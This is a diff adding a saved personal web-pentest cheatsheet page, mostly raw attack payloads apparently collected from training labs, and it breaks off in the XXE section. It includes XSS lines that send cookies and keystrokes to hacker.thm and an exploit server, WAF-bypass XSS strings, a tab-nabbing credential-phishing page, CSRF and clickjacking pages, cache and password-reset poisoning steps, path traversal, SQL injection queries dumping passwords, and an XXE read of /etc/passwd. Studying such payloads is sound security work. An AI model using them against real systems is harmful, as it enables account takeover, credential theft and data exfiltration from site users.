@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<!-- saved from url=(0078)#smb-%2D-445 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<title>General personal cheatsheet</title>
+	
+	<meta name="description" content="General personal cheatsheet">
+	
+	<meta name="author" content="Dane">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="./OSCP personal cheatsheet_files/bootstrap.min.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/font-awesome.min.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/syntax.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	
+</head>
+
+<body data-new-gr-c-s-check-loaded="14.1043.0" data-gr-ext-installed="" style="">
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/Liodeus">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:thibaultgalbourdin@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="https://liodeus.github.io/">
+				<img src="./OSCP personal cheatsheet_files/94b2c0c075c4ed839beee2dafbb2ac69.jpg" class="img-circle">
+				Liodeus
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="https://liodeus.github.io/">Home</a></li>
+				<!-- <li><a href="/">Categories</a></li> -->
+				<li><a href="https://liodeus.github.io/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+    <script src="https://tryhackme.com/badge/163948"></script>
+		<!-- <button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button> -->
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="https://liodeus.github.io/"><i class="fa fa-home"></i>Home</a></li>
+			<!-- <li><a href="/"><i class="fa fa-folder"></i>Categories</a></li> -->
+			<li><a href="https://liodeus.github.io/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="min-height:unset !important; height: 102% !important; overflow: auto;">
+		<!-- sidebar.html -->
+<ul>
+  <li>
+    <p><a href="#docker">Docker</a></p>
+  </li>
+  <li>
+    <p><a href="#vpn">VPN</a></p>
+  </li>
+  <li>
+    <p><a href="#ngrok">Ngrok</a></p>
+  </li>
+  <li>
+    <p><a href="#burp">Burp</a></p>
+  </li>
+  <li><a href="#web-pentest">Web Pentest</a>
+    <ul>
+      <li><a href="#process">Process</a></li>
+      <li><a href="#multiple-request-csrf">Multiple request CSRF</a></li>
+      <li><a href="#click-jacking">Click jacking</a></li>
+      <li><a href="#ssti">SSTI</a></li>
+      <li><a href="#tab-nabbing">Tab Nabbing</a></li>
+      <li><a href="#xss-image-upload">XSS Image Upload</a></li>
+      <li><a href="#host-header-injection">Host Header Injection</a></li>
+      <li><a href="#file-path-traversal">File path traversal</a></li>
+      <li><a href="#sql-injection">SQL injection</a></li>
+      <li><a href="#xxe-injection">XXE injection</a></li>
+      <li><a href="#cors">CORS exploitation</a></li>
+      <li><a href="#websocket">WebSocket</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#forensic">Forensic</a></p>
+  </li>
+  <li>
+    <p><a href="#printer-hacking">Printer hacking</a></p>
+  </li>
+  <li>
+    <p><a href="#mobile-pentest">Mobile Pentest</a></p>
+  </li>
+</ul>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>General personal cheatsheet </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   March 
+	   14th,
+	   
+	   2022
+	 </span>
+	  <div class="article_body">
+	  
+
+<hr>
+
+<h2 id="docker">Docker</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Create Dockerfile
+nano Dockerfile
+  '''
+  FROM nginx:1.10.1-alpine
+  COPY src/html /usr/share/nginx/html
+
+  #EXPOSE 80 (this can be set went run docker with -p 80)
+  #CMD ["nginx", "-g", "daemon off;"]
+  '''
+
+#cd to the folder contains Dockerfile and src
+docker build -t &lt;tag-name&gt; .
+
+#view images, running containers
+docker images
+docker ps -a
+
+#run
+docker run -d -p 80:80 &lt;image-id&gt;
+docker [stop/start/rm] brave_carver
+#remove image
+docker rmi &lt;image-id&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Create .war file
+cd /to/your/folder/location
+jar -cvf my_web_app.war *
+#Unzip/explode war file
+jar -xvf test.war
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Save docker image for transfering
+docker save -o ./dockerImage.tar &lt;imageName&gt;
+docker load -i ./dockerImage.tar
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Port scan in a docker container
+	#default gate way: 192.168.100.1
+	./nmap 192.168.100.1
+</code></pre></div></div>
+<hr>
+
+<h2 id="vpn">VPN</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#warp (1.1.1.1)
+#warp-cli register
+sudo systemctl start warp-svc.service
+warp-cli connect
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="ngrok">Ngrok</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Adding multiple ngrok tunnels in free version (https://www.youtube.com/watch?v=EciDB0lKk5Q)
+sudo nano ~/.ngrok2/ngrok.yml
+#add settings like these:
+tunnels:
+  tcp_RS:
+    proto: tcp
+    addr: 80
+  http_SV:
+    proto: http
+    addr: 8000
+#then start
+ngrok start -all
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="burp">Burp</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Setup macro
+Project options > Sessions > Session Handling Rules > Add
+	Change to Scope tab > Include all URLs
+	In Details tab > Rule Actions > Add > Run a macro
+		Select macro > Add 
+			[Macro Recorder] > Select the needed requests:
+				Ex:
+					GET /login
+					POST /login
+					GET /login2
+			> OK
+			[Macro Editor] > Test macro (check the final request's response)
+			> OK (x3)
+	#The macro will now automatically run before every request in the scope
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="web-pentest">Web Pentest</h2>
+<h3 id="process">Process</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Crawl carefully, try not to miss any request:
+  - Active scan
+  - Manually web browsing (try to understand web logic, businesses)
+  - Hidden files, directories scan
+-> Fill excel file
+(“If I only had an hour to chop down a tree, I would spend the first 45 minutes sharpening my axe.” – Abraham Lincoln.)
+2. Test every request, map every parameter in request with function to be clearer
+3. Review overall: spend rest of time try to RCE (if not yet)
+4. Report
+</code></pre></div></div>
+<h3 id="multiple-request-csrf">CSRF</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Multiple requests CSRF
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;EUC-JP&quot;&gt;
+    &lt;title&gt;CSRF Test page&lt;/title&gt;
+    &lt;script&gt;
+      var interval = 200;
+      var i = 0;
+      var formNum = 0;
+      window.onload = function() {
+        formNum = document.forms.length;
+        sendRequest();
+      };
+      var sendRequest = function() {
+        document.forms[i].submit();
+        i++;
+        if(i &lt; formNum) {
+          setTimeout(sendRequest, interval);
+        }
+      };
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
+    &lt;form action=&quot;#&quot; method=&quot;POST&quot; target=&quot;dummyIframe&quot;&gt;
+    &lt;/form&gt;
+    &lt;form action=&quot;#&quot; method=&quot;POST&quot; target=&quot;dummyIframe&quot;&gt; 
+       &lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;SEND&quot;&gt; 
+    &lt;/form&gt;
+  &lt;/body&gt;
+  &lt;iframe style=&quot;display: hidden&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot; name=&quot;dummyIframe&quot;&gt;&lt;/iframe&gt;
+&lt;/html&gt;
+
+</code></pre></div></div>
+<h3 id="click-jacking">Click Jacking</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Sample click jacking
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;style type="text/css"&gt;
+
+&lt;!--
+
+#iframe {
+
+    position: absolute;
+
+    top: 0px;
+
+    left: 0px;
+
+    Filter:alpha(opacity=0.1);
+
+    -moz-opacity: 0.1;
+
+    opacity: 0.1;
+
+    z-index: 10;
+
+}
+
+--&gt;
+
+&lt;/style&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;iframe id="iframe" src="●●●" width="100%" height="100%"&gt;&lt;/iframe&gt;
+
+&lt;div style="font-size:30px; bold; position:fixed; top:30px; left:30px"&gt;
+
+    &lt;a href="javascript:alert('clicked')"&gt;This is test page.&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Sample from portswigger
+&#x3c;&#x73;&#x74;&#x79;&#x6c;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x69;&#x66;&#x72;&#x61;&#x6d;&#x65;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x3a;&#x72;&#x65;&#x6c;&#x61;&#x74;&#x69;&#x76;&#x65;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x77;&#x69;&#x64;&#x74;&#x68;&#x3a;&#x24;&#x77;&#x69;&#x64;&#x74;&#x68;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x68;&#x65;&#x69;&#x67;&#x68;&#x74;&#x3a;&#x20;&#x24;&#x68;&#x65;&#x69;&#x67;&#x68;&#x74;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x70;&#x61;&#x63;&#x69;&#x74;&#x79;&#x3a;&#x20;&#x24;&#x6f;&#x70;&#x61;&#x63;&#x69;&#x74;&#x79;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7a;&#x2d;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x3a;&#x20;&#x32;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x64;&#x69;&#x76;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x3a;&#x61;&#x62;&#x73;&#x6f;&#x6c;&#x75;&#x74;&#x65;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x74;&#x6f;&#x70;&#x3a;&#x24;&#x74;&#x6f;&#x70;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6c;&#x65;&#x66;&#x74;&#x3a;&#x24;&#x73;&#x69;&#x64;&#x65;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7a;&#x2d;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x3a;&#x20;&#x31;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x3c;&#x2f;&#x73;&#x74;&#x79;&#x6c;&#x65;&#x3e;&#x0a;&#x3c;&#x64;&#x69;&#x76;&#x3e;&#x54;&#x65;&#x73;&#x74;&#x20;&#x6d;&#x65;&#x3c;&#x2f;&#x64;&#x69;&#x76;&#x3e;&#x0a;&#x3c;&#x69;&#x66;&#x72;&#x61;&#x6d;&#x65;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x59;&#x4f;&#x55;&#x52;&#x2d;&#x4c;&#x41;&#x42;&#x2d;&#x49;&#x44;&#x2e;&#x77;&#x65;&#x62;&#x2d;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2d;&#x61;&#x63;&#x61;&#x64;&#x65;&#x6d;&#x79;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x6d;&#x79;&#x2d;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3f;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x3d;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x40;&#x61;&#x74;&#x74;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x2d;&#x77;&#x65;&#x62;&#x73;&#x69;&#x74;&#x65;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x3e;&#x3c;&#x2f;&#x69;&#x66;&#x72;&#x61;&#x6d;&#x65;&#x3e;
+
+#if "the page can not be framed" due to Frame busting scripts, add this as an attribute to the iframe tag: sandbox="allow-forms"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Multistep clickjacking
+&#x3c;&#x73;&#x74;&#x79;&#x6c;&#x65;&#x3e;&#x0a;&#x09;&#x69;&#x66;&#x72;&#x61;&#x6d;&#x65;&#x20;&#x7b;&#x0a;&#x09;&#x09;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x3a;&#x72;&#x65;&#x6c;&#x61;&#x74;&#x69;&#x76;&#x65;&#x3b;&#x0a;&#x09;&#x09;&#x77;&#x69;&#x64;&#x74;&#x68;&#x3a;&#x24;&#x77;&#x69;&#x64;&#x74;&#x68;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3b;&#x0a;&#x09;&#x09;&#x68;&#x65;&#x69;&#x67;&#x68;&#x74;&#x3a;&#x20;&#x24;&#x68;&#x65;&#x69;&#x67;&#x68;&#x74;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3b;&#x0a;&#x09;&#x09;&#x6f;&#x70;&#x61;&#x63;&#x69;&#x74;&#x79;&#x3a;&#x20;&#x24;&#x6f;&#x70;&#x61;&#x63;&#x69;&#x74;&#x79;&#x3b;&#x0a;&#x09;&#x09;&#x7a;&#x2d;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x3a;&#x20;&#x32;&#x3b;&#x0a;&#x09;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x2e;&#x66;&#x69;&#x72;&#x73;&#x74;&#x43;&#x6c;&#x69;&#x63;&#x6b;&#x2c;&#x20;&#x2e;&#x73;&#x65;&#x63;&#x6f;&#x6e;&#x64;&#x43;&#x6c;&#x69;&#x63;&#x6b;&#x20;&#x7b;&#x0a;&#x09;&#x09;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x3a;&#x61;&#x62;&#x73;&#x6f;&#x6c;&#x75;&#x74;&#x65;&#x3b;&#x0a;&#x09;&#x09;&#x74;&#x6f;&#x70;&#x3a;&#x24;&#x74;&#x6f;&#x70;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x31;&#x3b;&#x0a;&#x09;&#x09;&#x6c;&#x65;&#x66;&#x74;&#x3a;&#x24;&#x73;&#x69;&#x64;&#x65;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x31;&#x3b;&#x0a;&#x09;&#x09;&#x7a;&#x2d;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x3a;&#x20;&#x31;&#x3b;&#x0a;&#x09;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x2e;&#x73;&#x65;&#x63;&#x6f;&#x6e;&#x64;&#x43;&#x6c;&#x69;&#x63;&#x6b;&#x20;&#x7b;&#x0a;&#x09;&#x09;&#x74;&#x6f;&#x70;&#x3a;&#x24;&#x74;&#x6f;&#x70;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x32;&#x3b;&#x0a;&#x09;&#x09;&#x6c;&#x65;&#x66;&#x74;&#x3a;&#x24;&#x73;&#x69;&#x64;&#x65;&#x5f;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x32;&#x3b;&#x0a;&#x09;&#x7d;&#x0a;&#x3c;&#x2f;&#x73;&#x74;&#x79;&#x6c;&#x65;&#x3e;&#x0a;&#x3c;&#x64;&#x69;&#x76;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x66;&#x69;&#x72;&#x73;&#x74;&#x43;&#x6c;&#x69;&#x63;&#x6b;&#x22;&#x3e;&#x54;&#x65;&#x73;&#x74;&#x20;&#x6d;&#x65;&#x20;&#x66;&#x69;&#x72;&#x73;&#x74;&#x3c;&#x2f;&#x64;&#x69;&#x76;&#x3e;&#x0a;&#x3c;&#x64;&#x69;&#x76;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x73;&#x65;&#x63;&#x6f;&#x6e;&#x64;&#x43;&#x6c;&#x69;&#x63;&#x6b;&#x22;&#x3e;&#x54;&#x65;&#x73;&#x74;&#x20;&#x6d;&#x65;&#x20;&#x6e;&#x65;&#x78;&#x74;&#x3c;&#x2f;&#x64;&#x69;&#x76;&#x3e;&#x0a;&#x3c;&#x69;&#x66;&#x72;&#x61;&#x6d;&#x65;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x59;&#x4f;&#x55;&#x52;&#x2d;&#x4c;&#x41;&#x42;&#x2d;&#x49;&#x44;&#x2e;&#x77;&#x65;&#x62;&#x2d;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2d;&#x61;&#x63;&#x61;&#x64;&#x65;&#x6d;&#x79;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x6d;&#x79;&#x2d;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x22;&#x3e;&#x3c;&#x2f;&#x69;&#x66;&#x72;&#x61;&#x6d;&#x65;&#x3e;
+</code></pre></div></div>
+<h3 id="ssti">SSTI</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>#SSTI tool</strong>
+https://github.com/epinna/tplmap
+Example usage: tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/passwd'
+
+#Fuzz string
+${{<%[%'"}}%\
+
+#https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+</code></pre></div></div>
+</div>
+<h3 id="tab-nabbing">Tab Nabbing</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>#Tab nabbing</strong>
+&lt;html&gt;
+&lt;script&gt;
+if (window.opener) window.opener.parent.location.replace("http://10.11.61.135:9000/index.html");
+if (window.parent != window) window.parent.location.replace("http://10.11.61.135:9000/index.html");
+&lt;/script&gt;
+test
+&lt;/html&gt;
+
+#######
+- The malicious html page above will pointing to index.html which would fool the victim send credentials through it (index.html should be cloned from the vuln web)
+- May need to use wireshark to catch creds from POST request
+</code></pre></div></div>
+
+<h3 id="xss-image-upload">XSS Image Upload</h3>
+<h4>SVG</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" standalone="no"?>
+&lt;!DOCTYPE svg PUBLIC
+"-//W3C//DTD SVG 1.1//EN"
+"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+&lt;svg width="200"        
+height="200"        
+zoomAndPan="disable"        
+xmlns="http://www.w3.org/2000/svg"        
+xmlns:xlink="http://www.w3.org/1999/xlink"        
+xml:space="preserve">
+&lt;!-- Script linked from the outside-->     
+&lt;script xlink:href="https://xxxx.burpcollaborator" />     
+&lt;script>       
+//&lt;![CDATA[         
+alert();       
+]]>     
+&lt;/script>   
+&lt;/svg>
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" standalone="no"?>
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+ 
+&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+&lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+&lt;script type="text/javascript">
+alert('This app is probably vulnerable to XSS attacks!');
+&lt;/script>
+&lt;/svg>
+</code></pre></div></div>
+
+<h4>XSS exploit</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>Session Stealing:</strong>
+&lt;script&gt;fetch(&#39;https://hacker.thm/steal?cookie=&#39; + btoa(document.cookie));&lt;/script&gt;
+
+#eval(atob('base64_encoded_payload'))
+---
+&lt;script>
+location.replace('https://vuln.web/post/comment/confirmation?postId=xxxxx%22%3E%3Cscript%3Elocation.replace(%27https%3A%2F%2Fexploit-id.exploit-server.net%2Flog%3Fcookie%3D%27%2Bdocument.cookie)%3C%2Fscript%3E');
+&lt;/script>
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>Key Logger:</strong>
+&lt;script&gt;document.onkeypress = function(e) { fetch(&#39;https://hacker.thm/log?key=&#39; + btoa(e.key) );}&lt;/script&gt;
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>Polyglots (super payload):</strong>
+jaVasCript:/*-/*`/*\`/*&#39;/*&quot;/**/(/* */onerror=alert(&#39;THM&#39;) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#39;THM&#39;)//&gt;\x3e
+
+#bypass Akamai WAF
+x&quot;&gt;&lt;svg%250donload%3D&quot;window%5B%27alert%27%5D(location[%27hostname%27])&quot;
+
+#bypass Amazon WAF
+&lt;a/+/OnMoUsEOVEr+=+(confirm)(document.domain)&gt;
+</code></pre></div></div>
+<hr>
+
+<h3 id="host-header-injection">Host Header Injection</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Web cache poisoning
+##Detect
+	- Change host header to attacker's hostname
+	- Check if the hostname reflected in response, ie: 
+		&lt;script type="text/javascript" src="//exploit-id.exploit-server.net/resources/js/tracking.js">&lt;/script>
+		(and X-Cache: miss)
+##Exploit
+	- Go to exploit server:
+		+ Change file to the same as resource in response: /resources/js/tracking.js
+		+ Change body: location.replace('https://exploit-id.exploit-server.net/?cookie='+document.cookie);
+	- Store payload -> resend request with host header replaced (X-Cache: miss) and wait for victim access the web cache (hit)
+
+#Password reset poisoning
+##Detect
+	- Change host header to attacker's hostname
+	- Check if the hostname reflected in response, ie: 
+		&lt;script type="text/javascript" src="//exploit-id.exploit-server.net/resources/js/tracking.js">&lt;/script>
+	- Reset password function will send email with token to user
+##Exploit
+	- Send reset password request with host header replaced by attacker's exploit-server
+	- Get link with token -> reset password
+</code></pre></div></div>
+<hr>
+
+<h3 id="file-path-traversal">File path traversal</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../../../etc/passwd
+/etc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+/var/www/images/../../../etc/passwd
+../../../etc/passwd%00.png
+</code></pre></div></div>
+<hr>
+
+<h3 id="sql-injection">SQL Injection</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0&quot;XOR(if(now()=sysdate(),sleep(9),0))XOR&quot;Z
+
+#MYSQL (UNION based)
+> get db name: 								0 union select 1,2,database()
+> list table in db: 					0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+> list column name in table: 	0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+> list data from table: 			0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users
+
+(Blind - Time based)
+> get db name: 								admin123' UNION SELECT SLEEP(2),2 where database() like 'sqli_four%';--
+> list table in db:						admin123' UNION SELECT SLEEP(2),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--
+> list column name in table:	admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+> list data from table:				admin123' UNION SELECT SLEEP(2),2 from users where username like 'a%
+															admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like 'a%
+--> Use sqlmap to save time: 	sqlmap -r request.txt	--dbms=mysql --dump
+
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Detect DBMS:
+- Oracle: requires all SELECT statements to explicitly specify a table name
+	-> Compare <b>SELECT null</b> vs <b>SELECT null FROM dual</b>
+
+#Detect table name:
+- '||(SELECT '' FROM users WHERE ROWNUM = 1)||' (WHERE ROWNUM = 1 to prevent the query from returning more than one row, which would break our concatenation)
+
+#Use condition
+- '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+-Add where condition: '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+	(#Verify that the condition is true (the error is received), confirming that there is a user called administrator.)
+-Guess password: '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+#Finger print timebased:
+- Use concat: x'||pg_sleep(10)--
+	or stack query: x';pg_sleep(10)--
+</code></pre></div></div>
+<hr>
+
+<h3 id="xxe-injection">XXE Injection</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Types:<ul>
+	<li>-> <b>Retrieve files:</b> <br>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x74;&#x65;&#x73;&#x74;&#x20;&#x5b;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x78;&#x78;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x65;&#x74;&#x63;&#x2f;&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;&#x22;&#x3e;&#x20;&#x5d;&#x3e;<br>&#x3c;&#x73;&#x74;&#x6f;&#x63;&#x6b;&#x43;&#x68;&#x65;&#x63;&#x6b;&#x3e;&#x3c;&#x70;&#x72;&#x6f;&#x64;&#x75;&#x63;&#x74;&#x49;&#x64;&#x3e;&#x26;&#x78;&#x78;&#x65;&#x3b;&#x3c;&#x2f;&#x70;&#x72;&#x6f;&#x64;&#x75;&#x63;&#x74;&#x49;&#x64;&#x3e;&#x3c;&#x2f;&#x73;&#x74;&#x6f;&#x63;&#x6b;&#x43;&#x68;&#x65;&#x63;&#x6b;&#x3e;
